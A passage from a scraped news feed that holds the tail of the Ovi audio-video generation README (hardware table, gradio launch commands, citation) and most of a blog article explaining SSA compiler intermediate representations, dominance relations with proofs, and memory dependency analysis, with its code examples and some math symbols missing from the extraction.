        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;~32 GB&lt;/cell&gt;
        &lt;cell&gt;~140s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;4&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~55s&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;8&lt;/cell&gt;
        &lt;cell&gt;Yes&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;No&lt;/cell&gt;
        &lt;cell&gt;~80 GB&lt;/cell&gt;
        &lt;cell&gt;~40s&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;We provide a simple script to run our model in a gradio UI. It uses the &lt;code&gt;ckpt_dir&lt;/code&gt; in &lt;code&gt;ovi/configs/inference/inference_fusion.yaml&lt;/code&gt; to initialize the model&lt;/p&gt;
    &lt;code&gt;python3 gradio_app.py

OR

# To enable cpu offload to save GPU VRAM, will slow down end to end inference by ~20 seconds
python3 gradio_app.py --cpu_offload

OR

# To enable an additional image generation model to generate first frames for I2V, cpu_offload is automatically enabled if image generation model is enabled
python3 gradio_app.py --use_image_gen

OR

# To run model with 24Gb GPU vram. No need to download additional models.
python3 gradio_app.py --cpu_offload --qint8

# To run model with 24Gb GPU vram
python3 gradio_app.py --cpu_offload --fp8
&lt;/code&gt;
    &lt;p&gt;We would like to thank the following projects:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Wan2.2: Our video branch is initialized from the Wan2.2 repository&lt;/item&gt;
      &lt;item&gt;MMAudio: We reused MMAudio's audio vae.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We welcome all types of collaboration! Whether you have feedback, want to contribute, or have any questions, please feel free to reach out.&lt;/p&gt;
    &lt;p&gt;Contact: Weimin Wang for any issues or feedback.&lt;/p&gt;
    &lt;p&gt;If Ovi is helpful, please help to ⭐ the repo.&lt;/p&gt;
    &lt;p&gt;If you find this project useful for your research, please consider citing our paper.&lt;/p&gt;
    &lt;code&gt;@misc{low2025ovitwinbackbonecrossmodal,
      title={Ovi: Twin Backbone Cross-Modal Fusion for Audio-Video Generation}, 
      author={Chetwin Low and Weimin Wang and Calder Katyal},
      year={2025},
      eprint={2510.01284},
      archivePrefix={arXiv},
      primaryClass={cs.MM},
      url={https://arxiv.org/abs/2510.01284}, 
}&lt;/code&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/character-ai/Ovi"/><published>2025-10-22T19:42:36+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45674568</id><title>Why SSA Compilers?</title><updated>2025-10-23T15:38:02.009081+00:00</updated><content>&lt;doc fingerprint="a60a918444bc9b09"&gt;
  &lt;main&gt;
    &lt;p&gt;If you’ve read anything about compilers in the last two decades or so, you have almost certainly heard of SSA compilers, a popular architecture featured in many optimizing compilers, including ahead-of-time compilers such as LLVM, GCC, Go, CUDA (and various shader compilers), Swift1, and MSVC2, and just-in-time compilers such as HotSpot C23, V84, SpiderMonkey5, LuaJIT, and the Android Runtime6.&lt;/p&gt;
    &lt;p&gt;SSA is hugely popular, to the point that most compiler projects no longer bother with other IRs for optimization7. This is because SSA is incredibly nimble at the types of program analysis and transformation that compiler optimizations want to do on your code. But why? Many of my friends who don’t do compilers often say that compilers seem like opaque magical black boxes, and SSA, as it often appears in the literature, is impenetrably complex.&lt;/p&gt;
    &lt;p&gt;But it’s not! SSA is actually very simple once you forget everything you think your programs are actually doing. We will develop the concept of SSA form, a simple SSA IR, prove facts about it, and design some optimizations on it.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;I have previously written about the granddaddy of all modern SSA compilers, LLVM. This article is about SSA in general, and won’t really have anything to do with LLVM. However, it may be helpful to read that article to make some of the things in this article feel more concrete.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;head rend="h2"&gt;What Is SSA?&lt;/head&gt;
    &lt;p&gt;SSA is a property of intermediate representations (IRs), primarily used by compilers for optimizing imperative code that target a register machine. Register machines are computers that feature a fixed set of registers that can be used as the operands for instructions: this includes virtually all physical processors, including CPUs, GPUs, and weird tings like DSPs.&lt;/p&gt;
    &lt;p&gt;SSA is most frequently found in compiler middle-ends, the optimizing component between the frontend (which deals with the surface language programmers write, and lowers it into the middle-end’s IR), and the backend (which takes the optimized IR and lowers it into the target platform’s assembly).&lt;/p&gt;
    &lt;p&gt;SSA IRs, however, often have little resemblance to the surface language they lower out of, or the assembly language they target. This is because neither of these representations make it easy for a compiler to intuit optimization opportunities.&lt;/p&gt;
    &lt;head rend="h3"&gt;Imperative Code Is Hard&lt;/head&gt;
    &lt;p&gt;Imperative code consists of a sequence of operations that mutate the executing machine’s state to produce a desired result. For example, consider the following C program:&lt;/p&gt;
    &lt;p&gt;This program returns &lt;code&gt;0&lt;/code&gt; no matter what its input is, so we can optimize it down to this:&lt;/p&gt;
    &lt;p&gt;But, how would you write a general algorithm to detect that all of the operations cancel out? You’re forced to keep in mind program order to perform the necessary dataflow analysis, following mutations of &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; through the program. But this isn’t very general, and traversing all of those paths makes the search space for large functions very big. Instead, you would like to rewrite the program such that &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; gradually get replaced with the expression that calculates the most recent value, like this:&lt;/p&gt;
    &lt;p&gt;Then we can replace each occurrence of a variable with its right-hand side recursively…&lt;/p&gt;
    &lt;p&gt;Then fold the constants together…&lt;/p&gt;
    &lt;p&gt;And finally, we see that we’re returning &lt;code&gt;argc - argc&lt;/code&gt;, and can replace it with &lt;code&gt;0&lt;/code&gt;. All the other variables are now unused, so we can delete them.&lt;/p&gt;
    &lt;p&gt;The reason this works so well is because we took a function with mutation, and converted it into a combinatorial circuit, a type of digital logic circuit that has no state, and which is very easy to analyze. The dependencies between nodes in the circuit (corresponding to primitive operations such as addition or multiplication) are obvious from its structure. For example, consider the following circuit diagram for a one-bit multiplier:&lt;/p&gt;
    &lt;p&gt;This graph representation of an operation program has two huge benefits:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;The powerful tools of graph theory can be used to algorithmically analyze the program and discover useful properties, such as operations that are independent of each other or whose results are never used.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The operations are not ordered with respect to each other except when there is a dependency; this is useful for reordering operations, something compilers really like to do.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The reason combinatorial circuits are the best circuits is because they are directed acyclic graphs (DAGs) which admit really nice algorithms. For example, longest path in a graph is NP-hard (and because 8, has complexity ). However, if the graph is a DAG, it admits an solution!&lt;/p&gt;
    &lt;p&gt;To understand this benefit, consider another program:&lt;/p&gt;
    &lt;p&gt;Suppose we wanted to replace each variable with its definition like we did before. We can’t just replace each constant variable with the expression that defines it though, because we would wind up with a different program!&lt;/p&gt;
    &lt;p&gt;Now, we pick up an extra &lt;code&gt;y&lt;/code&gt; term because the squaring operation is no longer unused! We can put this into circuit form, but it requires inserting new variables for every mutation.&lt;/p&gt;
    &lt;p&gt;But we can’t do this when complex control flow is involved! So all of our algorithms need to carefully account for mutations and program order, meaning that we don’t get to use the nice graph algorithms without careful modification.&lt;/p&gt;
    &lt;head rend="h2"&gt;The SSA Invariant&lt;/head&gt;
    &lt;p&gt;SSA stands for “static single assignment”, and was developed in the 80s as a way to enhance the existing three-argument code (where every statement is in the form &lt;code&gt;x = y op z&lt;/code&gt;) so that every program was circuit-like, using a very similar procedure to the one described above.&lt;/p&gt;
    &lt;p&gt;The SSA invariant states that every variable in the program is assigned to by precisely one operation. If every operation in the program is visited once, they form a combinatorial circuit. Transformations are required to respect this invariant. In circuit form, a program is a graph where operations are nodes, and “registers” (which is what variables are usually called in SSA) are edges (specifically, each output of an operation corresponds to a register).&lt;/p&gt;
    &lt;p&gt;But, again, control flow. We can’t hope to circuitize a loop, right? The key observation of SSA is that most parts of a program are circuit-like. A basic block is a maximal circuital component of a program. Simply put, it is a sequence of non-control flow operations, and a final terminator operation that transfers control to another basic block.&lt;/p&gt;
    &lt;p&gt;The basic blocks themselves form a graph, the control flow graph, or CFG. This formulation of SSA is sometimes called SSA-CFG9. This graph is not a DAG in general; however, separating the program into basic blocks conveniently factors out the “non-DAG” parts of the program, allowing for simpler analysis within basic blocks.&lt;/p&gt;
    &lt;p&gt;There are two equivalent formalisms for SSA-CFG. The traditional one uses special “phi” operations (often called phi nodes, which is what I will call them here) to link registers across basic blocks. This is the formalism LLVM uses. A more modern approach, used by MLIR, is block arguments: each basic block specifies parameters, like a function, and blocks transferring control flow to it must pass arguments of those types to it.&lt;/p&gt;
    &lt;head rend="h3"&gt;My First IR&lt;/head&gt;
    &lt;p&gt;Let’s look at some code. First, consider the following C function which calculates Fibonacci numbers using a loop.&lt;/p&gt;
    &lt;p&gt;How might we express this in an SSA-CFG IR? Let’s start inventing our SSA IR! It will look a little bit like LLVM IR, since that’s what I’m used to looking at.&lt;/p&gt;
    &lt;p&gt;Every block ends in a &lt;code&gt;goto&lt;/code&gt;, which transfers control to one of several possible blocks. In the process, it calls that block with the given arguments. One can think of a basic block as a tiny function which tails10 into other basic blocks in the same function.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;LLVM IR is… older, so it uses the older formalism of phi nodes. “Phi” comes from “phony”, because it is an operation that doesn’t do anything; it just links registers from predecessors.&lt;/p&gt;&lt;p&gt;A&lt;/p&gt;&lt;code&gt;phi&lt;/code&gt;operation is essentially a switch-case on the predecessors, each case selecting a register from that predecessor (or an immediate). For example,&lt;code&gt;@loop.start&lt;/code&gt;has two predecessors, the implicit entry block&lt;code&gt;@entry&lt;/code&gt;, and&lt;code&gt;@loop.body&lt;/code&gt;. In a phi node IR, instead of taking a block argument for&lt;code&gt;%n&lt;/code&gt;, it would specify&lt;p&gt;The value of the&lt;/p&gt;&lt;code&gt;phi&lt;/code&gt;operation is the value from whichever block jumped to this one.&lt;p&gt;This can be awkward to type out by hand and read, but is a more convenient representation for describing algorithms (just “add a phi node” instead of “add a parameter and a corresponding argument”) and for the in-memory representation, but is otherwise completely equivalent.&lt;/p&gt;&lt;/quote&gt;
    &lt;p&gt;It’s a bit easier to understand the transformation from C to our IR if we first rewrite the C to use goto instead of a for loop:&lt;/p&gt;
    &lt;p&gt;However, we still have mutation in the picture, so this isn’t SSA. To get into SSA, we need to replace every assignment with a new register, and somehow insert block arguments…&lt;/p&gt;
    &lt;head rend="h3"&gt;Entering SSA Form&lt;/head&gt;
    &lt;p&gt;The above IR code is already partially optimized; the named variables in the C program have been lifted out of memory and into registers. If we represent each named variable in our C program with a pointer, we can avoid needing to put the program into SSA form immediately. This technique is used by frontends that lower into LLVM, like Clang.&lt;/p&gt;
    &lt;p&gt;We’ll enhance our IR by adding a &lt;code&gt;stack&lt;/code&gt; declaration for functions, which defines scratch space on the stack for the function to use. Each stack slot produces a pointer that we can &lt;code&gt;load&lt;/code&gt; from and &lt;code&gt;store&lt;/code&gt; to.&lt;/p&gt;
    &lt;p&gt;Our Fibonacci function would now look like so:&lt;/p&gt;
    &lt;p&gt;Any time we reference a named variable, we load from its stack slot, and any time we assign it, we store to that slot. This is very easy to get into from C, but the code sucks because it’s doing lots of unnecessary pointer operations. How do we get from this to the register-only function I showed earlier?&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;We want program order to not matter for the purposes of reordering, but as we’ve written code here, program order does matter: loads depend on prior stores but stores don’t produce a value that can be used to link the two operations.&lt;/p&gt;&lt;p&gt;We can restore not having program order by introducing operands representing an “address space”; loads and stores take an address space as an argument, and stores return a new address space. An address space, or&lt;/p&gt;&lt;code&gt;mem&lt;/code&gt;, represents the state of some region of memory. Loads and stores are independent when they are not connected by a&lt;code&gt;mem&lt;/code&gt;argument.&lt;p&gt;This type of enhancement is used by Go’s SSA IR, for example. However, it adds a layer of complexity to the examples, so instead I will hand-wave this away.&lt;/p&gt;&lt;/quote&gt;
    &lt;head rend="h2"&gt;The Dominance Relation&lt;/head&gt;
    &lt;p&gt;Now we need to prove some properties about CFGs that are important for the definition and correctness of our optimization passes.&lt;/p&gt;
    &lt;p&gt;First, some definitions.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The predecessors (or “preds”) of a basic block is the set of blocks with an outgoing edge to that block. A block may be its own predecessors.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Some literature calls the above “direct” or immediate predecessors. For example, the preds of in our example are &lt;code&gt;@loop.start&lt;/code&gt; are &lt;code&gt;@entry&lt;/code&gt; (the special name for the function entry-point) &lt;code&gt;@loop.body&lt;/code&gt;.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The successors (no, not “succs”) of a basic block is the set of blocks with an outgoing edge from that block. A block may be its own successors.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;The sucessors of &lt;code&gt;@loop.start&lt;/code&gt; are &lt;code&gt;@exit&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt;. The successors are listed in the loop’s &lt;code&gt;goto&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;If a block &lt;code&gt;@a&lt;/code&gt; is a transitive pred of a block &lt;code&gt;@b&lt;/code&gt;, we say that &lt;code&gt;@a&lt;/code&gt; weakly dominates &lt;code&gt;@b&lt;/code&gt;, or that it is a weak dominator of &lt;code&gt;@b&lt;/code&gt;. For example, &lt;code&gt;@entry&lt;/code&gt;, &lt;code&gt;@loop.start&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt; both weakly dominate &lt;code&gt;@exit&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;However, this is not usually an especially useful relationship. Instead, we want to speak of dominators:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;A block&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;is a dominator (or dominates)&lt;code&gt;@b&lt;/code&gt;if every pred of&lt;code&gt;@b&lt;/code&gt;is dominated by&lt;code&gt;@a&lt;/code&gt;, or if&lt;code&gt;@a&lt;/code&gt;is&lt;code&gt;@b&lt;/code&gt;itself.&lt;p&gt;Equivalently, the dominator set of&lt;/p&gt;&lt;code&gt;@b&lt;/code&gt;is the intersection of the dominator sets of its preds, plus&lt;code&gt;@b&lt;/code&gt;.&lt;/quote&gt;
    &lt;p&gt;The dominance relation has some nice order properties that are necessary for defining the core graph algorithms of SSA.&lt;/p&gt;
    &lt;head rend="h3"&gt;Some Graph Theory&lt;/head&gt;
    &lt;p&gt;We only consider CFGs which are flowgraphs, that is, all blocks are reachable from the root block &lt;code&gt;@entry&lt;/code&gt;, which has no preds. This is necessary to eliminate some pathological graphs from our proofs. Importantly, we can always ask for an acyclic path11 from &lt;code&gt;@entry&lt;/code&gt; to any block &lt;code&gt;@b&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;An equivalent way to state the dominance relationship is that from every path from &lt;code&gt;@entry&lt;/code&gt; to &lt;code&gt;@b&lt;/code&gt; contains all of &lt;code&gt;@b&lt;/code&gt;’s dominators.&lt;/p&gt;
    &lt;quote&gt;&lt;code&gt;@a&lt;/code&gt;dominates&lt;code&gt;@b&lt;/code&gt;iff every path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;contains&lt;code&gt;@a&lt;/code&gt;.&lt;p&gt;First, assume every&lt;/p&gt;&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;path contains&lt;code&gt;@a&lt;/code&gt;. If&lt;code&gt;@b&lt;/code&gt;is&lt;code&gt;@a&lt;/code&gt;, we’re done. Otherwise we need to prove each predecessor of&lt;code&gt;@b&lt;/code&gt;is dominated by&lt;code&gt;@a&lt;/code&gt;; we do this by induction on the length of acyclic paths from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;. Consider preds&lt;code&gt;@p&lt;/code&gt;of&lt;code&gt;@b&lt;/code&gt;that are not&lt;code&gt;@a&lt;/code&gt;, and consider all acyclic paths from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@p&lt;/code&gt;; by appending&lt;code&gt;@b&lt;/code&gt;to them, we have an acyclic path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;, which must contain&lt;code&gt;@a&lt;/code&gt;. Because both the last and second-to-last elements of this are not&lt;code&gt;@a&lt;/code&gt;, it must be within the shorter path which is shorter than . Thus, by induction,&lt;code&gt;@a&lt;/code&gt;dominates&lt;code&gt;@p&lt;/code&gt;and therefore&lt;code&gt;@b&lt;/code&gt;&lt;p&gt;Going the other way, if&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;dominates&lt;code&gt;@b&lt;/code&gt;, and consider a path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;. The second-to-last element of is a pred&lt;code&gt;@p&lt;/code&gt;of&lt;code&gt;@b&lt;/code&gt;; if it is&lt;code&gt;@a&lt;/code&gt;we are done. Otherwise, we can consider the path made by deleting&lt;code&gt;@b&lt;/code&gt;at the end.&lt;code&gt;@p&lt;/code&gt;is dominated by&lt;code&gt;@a&lt;/code&gt;, and is shorter than , so we can proceed by induction as above.&lt;/quote&gt;
    &lt;p&gt;Onto those nice properties. Dominance allows us to take an arbitrarily complicated CFG and extract from it a DAG, composed of blocks ordered by dominance.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;The dominance relation is a partial order.&lt;/p&gt;&lt;p&gt;Dominance is reflexive and transitive by definition, so we only need to show blocks can’t dominate each other.&lt;/p&gt;&lt;p&gt;Suppose distinct&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;and&lt;code&gt;@b&lt;/code&gt;dominate each other.Pick an acyclic path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@a&lt;/code&gt;. Because&lt;code&gt;@b&lt;/code&gt;dominates&lt;code&gt;@a&lt;/code&gt;, there is a prefix of this path ending in&lt;code&gt;@b&lt;/code&gt;. But because&lt;code&gt;@a&lt;/code&gt;dominates&lt;code&gt;@b&lt;/code&gt;, some prefix of ends in&lt;code&gt;@a&lt;/code&gt;. But now must contain&lt;code&gt;@a&lt;/code&gt;twice, contradicting that it is acyclic.&lt;/quote&gt;
    &lt;p&gt;This allows us to write &lt;code&gt;@a &amp;lt; @b&lt;/code&gt; when &lt;code&gt;@a&lt;/code&gt; dominates &lt;code&gt;@b&lt;/code&gt;. There is an even more refined graph structure that we can build out of dominators, which follows immediately from the partial order theorem.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;The dominators of a basic block are totally ordered by the dominance relation.&lt;/p&gt;&lt;p&gt;Suppose&lt;/p&gt;&lt;code&gt;@a1 &amp;lt; @b&lt;/code&gt;and&lt;code&gt;@a2 &amp;lt; @b&lt;/code&gt;, but neither dominates the other. Then, there must exist acyclic paths from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;which contain both, but in different orders. Take the subpaths of those paths which follow&lt;code&gt;@entry ... @a1&lt;/code&gt;, and&lt;code&gt;@a1 ... @b&lt;/code&gt;, neither of which contains&lt;code&gt;@a2&lt;/code&gt;. Concatenating these paths yields a path from&lt;code&gt;@entry&lt;/code&gt;to&lt;code&gt;@b&lt;/code&gt;that does not contain&lt;code&gt;@a2&lt;/code&gt;, a contradiction.&lt;/quote&gt;
    &lt;p&gt;This tells us that the DAG we get from the dominance relation is actually a tree, rooted at &lt;code&gt;@entry&lt;/code&gt;. The parent of a node in this tree is called its immediate dominator.&lt;/p&gt;
    &lt;p&gt;Computing dominators can be done iteratively: the dominator set of a block &lt;code&gt;@b&lt;/code&gt; is the intersection the dominator sets of its preds, plus &lt;code&gt;@b&lt;/code&gt;. This algorithm runs in quadratic time.&lt;/p&gt;
    &lt;p&gt;A better algorithm is the Lengauer-Tarjan algorithm[^lta]. It is relatively simple, but explaining how to implement it is a bit out of scope for this article. I found a nice treatment of it here.&lt;/p&gt;
    &lt;p&gt;What’s important is we can compute the dominator tree without breaking the bank, and given any node, we can ask for its immediate dominator. Using immediate dominators, we can introduce the final, important property of dominators.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;The dominance frontier of a block&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;is the set of all blocks not dominated by&lt;code&gt;@a&lt;/code&gt;with at least one pred which&lt;code&gt;@a&lt;/code&gt;dominates.&lt;/quote&gt;
    &lt;p&gt;These are points where control flow merges from distinct paths: one containing &lt;code&gt;@a&lt;/code&gt; and one not. The dominance frontier of &lt;code&gt;@loop.body&lt;/code&gt; is &lt;code&gt;@loop.start&lt;/code&gt;, whose preds are &lt;code&gt;@entry&lt;/code&gt; and &lt;code&gt;@loop.body&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;There are many ways to calculate dominance frontiers, but with a dominance tree in hand, we can do it like this:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;For each block&lt;/p&gt;&lt;code&gt;@b&lt;/code&gt;with more than one pred, for each of its preds, let&lt;code&gt;@p&lt;/code&gt;be that pred. Add&lt;code&gt;@b&lt;/code&gt;to the dominance frontier of&lt;code&gt;@p&lt;/code&gt;and all of its dominators, stopping when encountering&lt;code&gt;@b&lt;/code&gt;’ immediate dominator.&lt;p&gt;We need to prove that every block examined by the algorithm winds up in the correct frontiers.&lt;/p&gt;&lt;p&gt;First, we check that every examined block&lt;/p&gt;&lt;code&gt;@b&lt;/code&gt;is added to the correct frontier. If&lt;code&gt;@a &amp;lt; @p&lt;/code&gt;, where&lt;code&gt;@p&lt;/code&gt;is a pred of&lt;code&gt;@b&lt;/code&gt;, and a&lt;code&gt;@d&lt;/code&gt;is&lt;code&gt;@b&lt;/code&gt;’s immediate dominator, then if&lt;code&gt;@a &amp;lt; @d&lt;/code&gt;,&lt;code&gt;@b&lt;/code&gt;is not in its frontier, because&lt;code&gt;@a&lt;/code&gt;must dominate&lt;code&gt;@b&lt;/code&gt;. Otherwise,&lt;code&gt;@b&lt;/code&gt;must be in&lt;code&gt;@a&lt;/code&gt;’s frontier, because&lt;code&gt;@a&lt;/code&gt;dominates a pred but it cannot dominate&lt;code&gt;@b&lt;/code&gt;, because then it would be dominated by&lt;code&gt;@i&lt;/code&gt;, a contradiction.&lt;p&gt;Second, we check that every frontier is complete. Consider a block&lt;/p&gt;&lt;code&gt;@a&lt;/code&gt;. If an examined block&lt;code&gt;@b&lt;/code&gt;is in its frontier, then&lt;code&gt;@a&lt;/code&gt;must be among the dominators of some pred&lt;code&gt;@p&lt;/code&gt;, and it must be dominated by&lt;code&gt;@b&lt;/code&gt;’s immediate dominator; otherwise,&lt;code&gt;@a&lt;/code&gt;would dominate&lt;code&gt;@b&lt;/code&gt;(and thus&lt;code&gt;@b&lt;/code&gt;would not be in its frontier). Thus,&lt;code&gt;@b&lt;/code&gt;gets added to&lt;code&gt;@a&lt;/code&gt;’s dominator.&lt;/quote&gt;
    &lt;p&gt;You might notice that all of these algorithms are quadratic. This is actually a very good time complexity for a compilers-related graph algorithm. Cubic and quartic algorithms are not especially uncommon, and yes, your optimizing compiler’s time complexity is probably cubic or quartic in the size of the program!&lt;/p&gt;
    &lt;head rend="h2"&gt;Lifting Memory&lt;/head&gt;
    &lt;p&gt;Ok. Let’s construct an optimization. We want to figure out if we can replace a load from a pointer with the most recent store to that pointer. This will allow us to fully lift values out of memory by cancelling out store/load pairs.&lt;/p&gt;
    &lt;p&gt;This will make use of yet another implicit graph data structure.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;The dataflow graph is the directed graph made up of the internal circuit graphs of each each basic block, connected along block arguments.&lt;/p&gt;
      &lt;p&gt;To follow a use-def chain is to walk this graph forward from an operation to discover operations that potentially depend on it, or backwards to find operations it potentially depends on.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;It’s important to remember that the dataflow graph, like the CFG, does not have a well defined “up” direction. Navigating it and the CFG requires the dominator tree.&lt;/p&gt;
    &lt;p&gt;One other important thing to remember here is that every instruction in a basic block always executes if the block executes. In much of this analysis, we need to appeal to “program order” to select the last load in a block, but we are always able to do so. This is an important property of basic blocks that makes them essential for constructing optimizations.&lt;/p&gt;
    &lt;head rend="h3"&gt;Forward Dataflow&lt;/head&gt;
    &lt;p&gt;For a given &lt;code&gt;store %p, %v&lt;/code&gt;, we want to identify all loads that depend on it. We can follow the use-def chain of &lt;code&gt;%p&lt;/code&gt; to find which blocks contain loads that potentially depend on the store (call it &lt;code&gt;%s&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;First, we can eliminate loads within the same basic block (call it &lt;code&gt;@a&lt;/code&gt;). Replace all &lt;code&gt;load %p&lt;/code&gt; instructions after &lt;code&gt;s&lt;/code&gt; (but before any other &lt;code&gt;store %p, _&lt;/code&gt;s, in program order) with &lt;code&gt;%v&lt;/code&gt;’s def. If &lt;code&gt;s&lt;/code&gt; is not the last store in this block, we’re done.&lt;/p&gt;
    &lt;p&gt;Otherwise, follow the use-def chain of &lt;code&gt;%p&lt;/code&gt; to successors which use &lt;code&gt;%p&lt;/code&gt;, i.e., successors whose &lt;code&gt;goto&lt;/code&gt; case has &lt;code&gt;%p&lt;/code&gt; as at least one argument. Recurse into those successors, and now replacing the pointer &lt;code&gt;%p&lt;/code&gt; of interest with the parameters of the successor which were set to &lt;code&gt;%p&lt;/code&gt; (more than one argument may be &lt;code&gt;%p&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;If successor &lt;code&gt;@b&lt;/code&gt; loads from one of the registers holding &lt;code&gt;%p&lt;/code&gt;, replace all such loads before a store to &lt;code&gt;%p&lt;/code&gt;. We also now need to send &lt;code&gt;%v&lt;/code&gt; into &lt;code&gt;@b&lt;/code&gt; somehow.&lt;/p&gt;
    &lt;p&gt;This is where we run into something of a wrinkle. If &lt;code&gt;@b&lt;/code&gt; has exactly one predecessor, we need to add a new block argument to pass whichever register is holding &lt;code&gt;%v&lt;/code&gt; (which exists by induction). If &lt;code&gt;%v&lt;/code&gt; is already passed into &lt;code&gt;@b&lt;/code&gt; by another argument, we can use that one.&lt;/p&gt;
    &lt;p&gt;However, if &lt;code&gt;@b&lt;/code&gt; has multiple predecessors, we need to make sure that every path from &lt;code&gt;@a&lt;/code&gt; to &lt;code&gt;@b&lt;/code&gt; sends &lt;code&gt;%v&lt;/code&gt;, and canonicalizing those will be tricky. Worse still, if &lt;code&gt;@b&lt;/code&gt; is in &lt;code&gt;@a&lt;/code&gt;’s domination frontier, a different store could be contributing to that load! For this reason, dataflow from stores to loads is not a great strategy.&lt;/p&gt;
    &lt;p&gt;Instead, we’ll look at dataflow from loads backwards to stores (in general, dataflow from uses to defs tends to be more useful), which we can use to augment the above forward dataflow analysis to remove the complex issues around domination frontiers.&lt;/p&gt;
    &lt;head rend="h3"&gt;Dependency Analysis&lt;/head&gt;
    &lt;p&gt;Let’s analyze loads instead. For each &lt;code&gt;load %p&lt;/code&gt; in &lt;code&gt;@a&lt;/code&gt;, we want to determine all stores that could potentially contribute to its value. We can find those stores as follows:&lt;/p&gt;
    &lt;p&gt;We want to be able to determine which register in a given block corresponds to the value of &lt;code&gt;%p&lt;/code&gt;, and then find its last store in that block.&lt;/p&gt;
    &lt;p&gt;To do this, we’ll flood-fill the CFG backwards in BFS order. This means that we’ll follow preds (through the use-def chain) recursively, visiting each pred before visiting their preds, and never revisiting a basic block (except we may need to come back to &lt;code&gt;@a&lt;/code&gt; at the end).&lt;/p&gt;
    &lt;p&gt;Determining the “equivalent”12 of &lt;code&gt;%p&lt;/code&gt; in &lt;code&gt;@b&lt;/code&gt; (we’ll call it &lt;code&gt;%p.b&lt;/code&gt;) can be done recursively: while examining &lt;code&gt;@b&lt;/code&gt;, follow the def of &lt;code&gt;%p.b&lt;/code&gt;. If &lt;code&gt;%p.b&lt;/code&gt; is a block parameter, for each pred &lt;code&gt;@c&lt;/code&gt;, set &lt;code&gt;%p.c&lt;/code&gt; to the corresponding argument in the &lt;code&gt;@b(...)&lt;/code&gt; case in &lt;code&gt;@c&lt;/code&gt;’s &lt;code&gt;goto&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Using this information, we can collect all stores that the load potentially depends on. If a predecessor &lt;code&gt;@b&lt;/code&gt; stores to &lt;code&gt;%p.b&lt;/code&gt;, we add the last such store in &lt;code&gt;@b&lt;/code&gt; (in program order) to our set of stores, and do not recurse to &lt;code&gt;@b&lt;/code&gt;’s preds (because this store overwrites all past stores). Note that we may revisit &lt;code&gt;@a&lt;/code&gt; in this process, and collect a store to &lt;code&gt;%p&lt;/code&gt; from it occurs in the block. This is necessary in the case of loops.&lt;/p&gt;
    &lt;p&gt;The result is a set &lt;code&gt;stores&lt;/code&gt; of &lt;code&gt;(store %p.s %v.s, @s)&lt;/code&gt; pairs. In the process, we also collected a set of all blocks visited, &lt;code&gt;subgraph&lt;/code&gt;, which are dominators of &lt;code&gt;@a&lt;/code&gt; which we need to plumb a &lt;code&gt;%v.b&lt;/code&gt; through. This process is called memory dependency analysis, and is a key component of many optimizations.&lt;/p&gt;
